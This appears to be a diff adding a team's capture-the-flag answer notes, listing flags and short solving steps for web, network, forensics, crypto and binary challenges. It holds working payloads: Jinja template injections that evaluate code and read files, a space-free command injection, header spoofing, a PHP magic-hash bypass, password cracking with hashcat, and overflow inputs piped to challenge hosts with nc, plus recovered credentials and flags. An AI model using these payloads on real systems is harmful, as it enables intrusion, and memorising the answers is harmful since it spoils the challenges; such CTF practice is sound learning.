@@ -1,0 +1,171 @@
+WE01
+unicode+obfuscation=js*fun
+Run code in console
+
+WE02
+Shhh_robot_you_said_too_much!
+robots.txt
+
+WM01
+XGHEV7HGEV
+/new-images
+Different modified date, go to mii-home
+JS debugger
+Email: rupert@get-vizual.med.ia
+Pass: newyork
+View office feed
+
+WM02
+epoch_wizard
+User ID 0
+Username: admin
+Use the hash functions
+
+WM03
+theLOOSEtheMATH&theTRUTHY
+PHP == md5 exploit
+aaguuoov
+0e282283763518139016553633984318
+
+WM04
+t3mpl4te_vu1n
+Flask template injection
+{{locals()}}
+
+WM05
+bh%3kx9j75%3k2*7!n
+Command injection without spaces
+/&&CMD=$'\\x20-r\\x20flag'&&grep$CMD
+
+WH01
+iPSpooFinGWiThHopHeaDers91918
+dirsearch => readme.txt
+Spoof IP with the X-Forwarded-For header
+Engineering moved the subnet, fuzz for it to find the below header
+X-Forwarded-For: 192.168.0.62
+
+WH02
+giTisAGreat_ResoURCe8337
+Download all the git files (found using dirsearch)
+$git show
+
+WX01
+muLtiStagingIT710-12
+Jinja template injection again
+{{ globals()['__builtins__']['eval'](\"[x for x in __import__('os').walk('.')]\") }}
+{{ globals()['__builtins__']['eval'](\"open('lambda_function.py', 'r').read()[1000:]\") }}
+
+NE01
+Nmap_0f_the_W0rld!
+nmap -sV -Pn cfta-ne01.allyourbases.co
+
+NM01
+o[hex]=>i[ascii]=:)
+Write a short Python script to be fast enough
+
+FE01
+pst_i'm_in_here!
+Use libpff to export all .ost items
+Calendar appointment has the password
+Email has the flag.zip attachment
+
+FE02
+unlimited_free_texts
+$ dig +trace cfta-fe02.allyourbases.co ANY
+
+FE03
+8191-SiMpLeFilESysTemForens1Cs
+Untar file, look at last layer, do strings to find zip password, unzip
+
+FE04
+YXx52hsi3ZQ5b9rS
+^..x[2-6].*S$, manually look for Z
+
+FM01
+tr4il3r_p4rk
+Use http://exif.regex.info/exif.cgi
+
+FM02
+NESted_in_a_PCAP
+MarioRulez1985
+Find the zip file (starts with a 7z), extract with the password
+Run strings -n 10 on the .nes to get flag
+
+FM03
+Us3_5tr0ng_P@55w0Rds!
+Assuming Veracrypt uses default algorithm, run below on Kali Linux:
+$ hashcat -a 0 -m 13721 dir_volume /usr/share/wordlists/rockyou.txt
+Password is "redwings"
+
+FH01
+C4tch1ng_H0n3y_p0Ts_w1TH_a_Sh4rk!
+Look at the UDP stream
+I coded a custom thing to delete the 16 byte "counter" header from each packet
+Tedious to get it working
+Once you got it, get 5 files, unzip the 5th one to get a .jpg with the flag
+
+CM01
+A_Code_For_A_Code
+XOR the two images to get a new QR code
+Scan that to get the flag
+
+CM02
+frequently_substitute_frowny_face_for_smiley_face
+Replace the 26 emojis with letters from a to z
+Then, give to a substitution cipher solver to get decoded text
+
+CH01
+shaRinGisCaRinG-010
+https://crypto.stackexchange.com/questions/1614/rsa-cracking-the-same-message-is-sent-to-two-different-people-problem
+
+CH02
+ShimmyShimmyYa
+One time pad is used twice, c1 xor c2 = m1 xor m2
+Guess the flag with English words
+
+CX01
+1BvBytaskgTZkJEEUEkBxv6kDWbAKabnmK
+Learn BIP-39 with https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki
+Try all possible words with a Python script
+Use https://github.com/trezor/python-mnemonic to find seed
+Finally, use https://iancoleman.io/bip39/ to find the derivation path
+
+BE01
+wh1ch_came_f1rst?
+$ binwalk
+Then extract a bunch of zips with $ unzip
+
+BE02
+luckyNumber13
+Input a whole bunch of characters to cause a "stack overflow"
+
+BM01
+wh1te%BluE$R3d
+Debug in GDB, bypass the password check...? by jumping to the other path
+
+BM02
+patchItFixIt
+Jump to the other path, make sure to set argument to 0x539 before going to printFlag
+
+BM03
+debugging_ftw
+Break before going into the output function
+set $eax=5
+
+BH01
+aLittLeObfuScatIonalCharActEr
+Break while it's looking for input
+Ghidra shows it uses some random thing, and then seems to decrypt the flag
+Use $bt in gdb to find main function
+Instinctively set $eax=0x80 right before it sets rbp-0x84, so the while loop decrypts the entire message
+
+BX01
+AlOnGSeaRcHFoROverWriTe
+echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>.>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>><>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" | nc cfta-bx01.allyourbases.co 8012
+
+BX02
+ThIsOneIsAbITFuZZy-6y
+Fuzz one character to find '#' acts weird
+Try sending a whole bunch (trying to cause buffer overflow) to find weird message "userID of 1"
+Figure out the boundary when that happens, then send a '1' to get flag
+Exploit: '#'*2007 + '1'
